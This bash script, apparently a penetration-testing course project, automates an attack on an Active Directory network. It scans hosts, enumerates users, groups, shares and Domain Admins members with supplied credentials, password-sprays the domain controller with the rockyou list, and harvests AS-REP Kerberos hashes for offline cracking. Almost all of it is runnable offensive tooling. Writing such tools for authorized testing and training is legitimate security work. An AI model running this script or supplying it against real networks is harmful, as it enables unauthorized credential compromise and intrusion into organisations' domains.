#!/bin/bash
BLUE="\e[34m"
PURPLE="\e[35m"
RESET="\e[0m"

# Function to check if the script is run as root and to check/install necessary packages
function CHECK() {
    echo
    echo -e "${PURPLE}[*] Function (1) CHECK${RESET}"
    
    # Check if the current user is root
    if [ "$(whoami)" != "root" ]; then
        echo "Must be root to run, exiting now..."
        exit
    else
        echo "You are root, continuing..."
    fi

    # Function to check if a package is installed
    CHECK-PACKAGE() {
        dpkg -l | grep -qw "$1"
        return $?
    }

    tools="nmap masscan crackmapexec impacket smbclient enscript ghostscript"
    echo
    echo "Checking if the necessary tools are installed."
    
    # Checks if the package is installed and if not, installs it
    for i in $tools; do 
        if CHECK-PACKAGE $i; then
            echo -e "[*] ${BLUE}$i${RESET} is installed"
        else 
            echo "Installing ${BLUE}[*]$i...${RESET}"
            sudo apt-get install $i
        fi
        sleep 1
    done
}

# Function to get user input for directory creation, network range, domain, and scan modes
function INPUT() {
    echo
    echo -e "${PURPLE}[*] Function (2) INPUT${RESET}"
    
    # Loop to get a valid directory name from the user
    while true; do
        read -p "[?] Please enter the name of the directory you wish to create. All results will be saved in this directory: " OUT_DIR
        read -p "[?] You have chosen the name '$OUT_DIR'. Is this input correct? (y/n): " ANS
        
        # Check if the user confirmed the directory name
        if [[ $ANS == "y" || $ANS == "Y" ]]; then
            # Check if the directory already exists
            if [[ -d "$OUT_DIR" ]]; then
                echo "[-] Directory '$OUT_DIR' already exists. Please choose another name."
            else
                echo -e "[*] Creating the directory ${BLUE}$OUT_DIR${RESET}"
                mkdir "$OUT_DIR"  # Create the directory
                cd "$OUT_DIR"     # Change to the new directory
                break
            fi
        elif [[ $ANS == "n" || $ANS == "N" ]]; then
            echo "[-] Input is incorrect. Please try again."
        else
            echo "[-] Invalid answer. Please type 'y' or 'n'."
        fi
    done

    echo 
    while true; do
        read -p "[?] Please enter the network range you wish to scan: " RANGE
        nmap $RANGE -sL 2>.check 1>.scan
        
        # Check if the range is valid
        if [ ! -z "$(cat .check)" ]; then
            echo "[-] Range is not valid, please enter a correct range"
        else 
            echo "[+] Range is valid, continuing..."
            break
        fi
    done
    
    echo
    # Getting the domain, domain username and password input
    while true; do
        read -p "[?] Please enter the domain name: " DOMAIN
        read -p "[?] Please enter AD username: " ADUSER
        read -p "[?] Please enter AD password: " ADPASS
        echo -e "[*] Domain name: ${BLUE}$DOMAIN${RESET}"
        echo -e "[*] Active Directory username: ${BLUE}$ADUSER${RESET}"
        echo -e "[*] Active Directory password: ${BLUE}$ADPASS${RESET}"
        read -p "[?] Are those inputs correct? (y/n): " ANSWER
        if [[ $ANSWER == "y" || $ANSWER == "Y" ]]; then
            echo "Continuing..."
            break
        elif [[ $ANSWER == "n" || $ANSWER == "N" ]]; then
            echo "[*] Please re-type the input."
        else
            echo "[!] Invalid input. Please enter 'y' or 'n'."
        fi
    done
    
    # Getting the scan mode input from the user
    echo
    while true; do
        read -p "[?] Choose a basic, intermediate or full scan. 1 will be a basic scan, 2 will be an intermediate scan, 3 will be a full scan: " SCAN_MODE
        if [[ "$SCAN_MODE" == "1" ]]; then
            break
        elif [[ "$SCAN_MODE" == "2" ]]; then
            break
        elif [[ "$SCAN_MODE" == "3" ]]; then
            break
        else
            echo "[-] Invalid input. Please choose 1 (basic), 2 (intermediate) or 3 (full)."
        fi
    done
    
    # Getting the enumeration mode input from the user
    while true; do
        read -p "[?] Choose a (1) basic, (2) intermediate or (3) full enumeration mode: " ENUM_MODE 
        if [[ "$ENUM_MODE" == "1" ]]; then
            break
        elif [[ "$ENUM_MODE" == "2" ]]; then
            break
        elif [[ "$ENUM_MODE" == "3" ]]; then
            break
        else
            echo "[-] Invalid input. Please choose 1 (basic), 2 (intermediate) or 3 (full)."
        fi
    done
   
    # Getting the exploitation mode input fro the user
    while true; do
        read -p "[?] Choose a (1) basic, (2) intermediate or (3) full exploitation mode: " EX_MODE 
        if [[ "$EX_MODE" == "1" ]]; then
            break
        elif [[ "$EX_MODE" == "2" ]]; then
            break
        elif [[ "$EX_MODE" == "3" ]]; then
            break
        else
            echo "[-] Invalid input. Please choose 1 (basic), 2 (intermediate) or 3 (full)."
        fi
    done
}

# Function to check which hosts are up and generate a list of active IPs
function UP() {
    echo
    echo -e "${PURPLE}[*] Function (3) UP${RESET}"
    echo "[*] Checking which hosts are up and generating a list..."
    
    # Use nmap to check for active hosts and save the output
    nmap $RANGE -Pn --open > /dev/null 2>&1 -oG up_hosts.lst
    cat up_hosts.lst | grep Up | awk '{print $2}' > ip.lst
    rm up_hosts.lst
    
    # Create a directory for scan results
    mkdir SCAN
    for i in $(cat ip.lst); do
        mkdir ./SCAN/$i  # Create a directory for each active IP
    done
}

# Function to perform different types of scans based on user input
function SCAN() {
    echo
    echo -e "${PURPLE}[*] Function (4) SCAN${RESET}"
    
    if [[ "$SCAN_MODE" == "1" ]]; then
        echo -e "[*] Starting a ${BLUE}basic${RESET} scan on $RANGE"
        for i in $(cat ip.lst); do
            cd ./SCAN/$i
            nmap -Pn $i > /dev/null 2>&1 -oN basic_scan  # Perform a basic scan
            cd ../..  # Return to the previous directory
        done
    elif [[ "$SCAN_MODE" == "2" ]]; then
        echo -e "[*] Starting an ${BLUE}intermediate${RESET} scan on $RANGE"
        for i in $(cat ip.lst); do
            cd SCAN
            cd $i
            nmap -Pn $i -p- > /dev/null 2>&1 -oN intermediate_scan  # Perform an intermediate scan
            cd ../..  # Return to the previous directory
        done
    elif [[ "$SCAN_MODE" == "3" ]]; then
        echo -e "[*] Starting a ${BLUE}full${RESET} scan on $RANGE"
        for i in $(cat ip.lst); do     
            cd ./SCAN/$i
            nmap -Pn $i -p- > /dev/null 2>&1 -oN full_tcp_scan  # Perform a full TCP scan
            masscan -pU:0-65535 $i --rate 1000 -oG full_udp_scan > /dev/null 2>&1  # Perform a full UDP scan
            cd ../.. 
        done
    fi
}

# Function to perform basic enumeration to find Domain Controller IP and DHCP IP
function BASIC_ENUM() {
    echo "[*] Finding the Domain Controller IP:"

    # Loop through IPs to find the Domain Controller IP
    for dir in $(cat ip.lst); do
        if grep -q "389" SCAN/"$dir"/*scan; then
            DC_IP="$dir"
            echo -e "${BLUE}$DC_IP${RESET}"
        fi
    done
    
    echo "[*] Finding the IP of the DHCP:"
    sudo nmap $RANGE --script=broadcast-dhcp-discover > /dev/null 2>&1 -oN dhcp_ip
    DHCP_IP=$(cat dhcp_ip | grep "Server Identifier" | awk '{print $4}')
    echo -e "${BLUE}$DHCP_IP${RESET}" 
    rm dhcp_ip

    # Loop through each IP to find open ports
    for i in $(cat ip.lst); do
        cd SCAN/$i
        cat *scan | grep "tcp" | grep "open" | awk -F '/' '{print $1}' > open_ports
        paste -sd, open_ports | sudo tee ports.lst > /dev/null
        nmap $i -p $(cat ports.lst) -sV > /dev/null 2>&1 -oN service_nmap_scan
        rm ports.lst
        rm open_ports
        cd ../..  
    done
}

# Function for intermediate enumeration including shared folders and key services
function INTER_ENUM() {
    BASIC_ENUM
    echo "[*] Displaying the shared folders and saving the results..."
    smbclient -L //"$DC_IP" -U "$ADUSER"%"$ADPASS" 2>/dev/null | tee ./ENUM/shares
    echo
    
    declare -A services
    services=( 
        ["FTP"]=21
        ["SSH"]=22
        ["SMB"]=445
        ["WinRM"]=5985
        ["LDAP"]=389
        ["RDP"]=3389
    )

    # Perform enumeration of key services
    echo "Finding the IP for the key services on $RANGE..."

    # Loop through each service and scan for it
    for service in "${!services[@]}"; do
        port=${services[$service]}
        echo "Scanning for $service on port $port..."
        nmap -p "$port" --open "$RANGE" -oG - | grep "/open" | awk -v srv="$service" '{print srv ": " $2}' | tee -a ./ENUM/services_ip
    done 

    # Run specific nmap scripts for enumeration
    scripts=("smb-os-discovery.nse" "ldap-search.nse" "nbstat.nse")
    echo
    for i in "${scripts[@]}"; do
        echo -e "Running script: ${BLUE}$i${RESET}"
        nmap "$DC_IP" -Pn -sV --script="$i" -oN ./ENUM/"Enum_$i" > /dev/null 2>&1
    done
}

# Function for full enumeration including users, groups, and password policy
function FULL_ENUM() {
    INTER_ENUM
    echo "[*] Extracting Users..."
    rpcclient -U "$DOMAIN"/"$ADUSER"%"$ADPASS" "$DC_IP" -c 'enumdomusers' | awk -F '[' '{print $2}' | awk -F ']' '{print $1}' > ./ENUM/AD_users
    echo -e "[*] Found ${BLUE}$(cat ./ENUM/AD_users | wc -l) users${RESET}"
    echo -e "[*] Usernames will be saved in a file named ${BLUE}AD_users${RESET}"

    echo "[*] Extracting groups..."
    rpcclient -U "$DOMAIN"/"$ADUSER"%"$ADPASS" "$DC_IP" -c 'enumdomgroups' | awk -F '[' '{print $2}' | awk -F ']' '{print $1}' > ./ENUM/AD_groups
    echo -e "[*] Found ${BLUE}$(cat ./ENUM/AD_groups | wc -l) groups${RESET}"
    echo -e "[*] Group names will be saved in a file named ${BLUE}AD_groups${RESET}"

    echo "[*] Displaying password policy..."
    crackmapexec smb "$DC_IP" -u "$ADUSER" -p "$ADPASS" --pass-pol | tail -n +4 | tee ./ENUM/pass_policy
    echo -e "[*] The password policy will also be saved in the ${BLUE}pass_policy${RESET} file"

    echo "[*] Displaying accounts that are members of the Domain Admins group..."
    crackmapexec smb "$DC_IP" -u "$ADUSER" -p "$ADPASS" --groups 'Domain Admins' | tail -n +4 | tee ./ENUM/domain_admin_members 
    echo -e "[*] The group members will be saved in the ${BLUE}domain_admin_members${RESET} file"
}

# Calling for the chosen enumeration function
function ENUM() {
    echo 
    echo -e "${PURPLE}[*] Function (5) ENUM${RESET}"
    mkdir ENUM
    if [[ "$ENUM_MODE" == "1" ]]; then
        BASIC_ENUM
    elif [[ "$ENUM_MODE" == "2" ]]; then
        INTER_ENUM
    else 
        FULL_ENUM
    fi
}

# Function for basic exploitation using nmap vulnerability scripts
function BASIC_EXPLOIT() {
    echo "[*] Commencing the basic exploit using the nmap vulnerabilities nse scripts"
    for i in $(cat ip.lst); do
        nmap $i -Pn -sV -p- --script=vuln > /dev/null 2>&1 -oN ./EXPLOIT/vulner_scan_$i 
    done
}

# Function for intermediate exploitation including password spraying
function INTER_EXPLOIT() {
    BASIC_EXPLOIT
    echo "[*] Commencing password spraying..."
    gunzip /usr/share/wordlists/rockyou.txt.gz
    PASS_LIST="/usr/share/wordlists/rockyou.txt"
    crackmapexec smb "$DC_IP" -u ./ENUM/AD_users -p $PASS_LIST --continue-on-success | grep '+' | tee ./EXPLOIT/pass_spray
}

# Function for full exploitation including Kerberos ticket retrieval
function FULL_EXPLOIT() {
    INTER_EXPLOIT
    echo "[*] Attempting to get kerberos tickets..."
    impacket-GetNPUsers "$DOMAIN"/ -usersfile ./ENUM/AD_users -dc-ip "$DC_IP" -request 2>/dev/null | grep '$krb' | tee ./EXPLOIT/kerberos_tickets
}

# Calling for the chosen exploit function
function EXPLOIT() {
    echo 
    echo -e "${PURPLE}[*] Function (6) EXPLOIT${RESET}"
    mkdir EXPLOIT
    if [[ "$EX_MODE" == "1" ]]; then
        BASIC_EXPLOIT
    elif [[ "$EX_MODE" == "2" ]]; then
        INTER_EXPLOIT
    else 
        FULL_EXPLOIT
    fi
}

# Function to create a PDF report with all results
function RESULTS() {
    echo 
    echo -e "${PURPLE}[*] Function (7) RESULTS${RESET}"
    echo "[*] Creating a pdf with all the results..."
    cat ./SCAN/*/* >> results
    cat ./ENUM/* >> results
    cat ./EXPLOIT/* >> results
    enscript results -o res
    ps2pdf res results.pdf  
    rm res
    echo -e "[+] Created ${BLUE}results.pdf${RESET}"
}

# Calling the functions in the appropriate order
CHECK
INPUT
UP
SCAN
ENUM
EXPLOIT
RESULTS
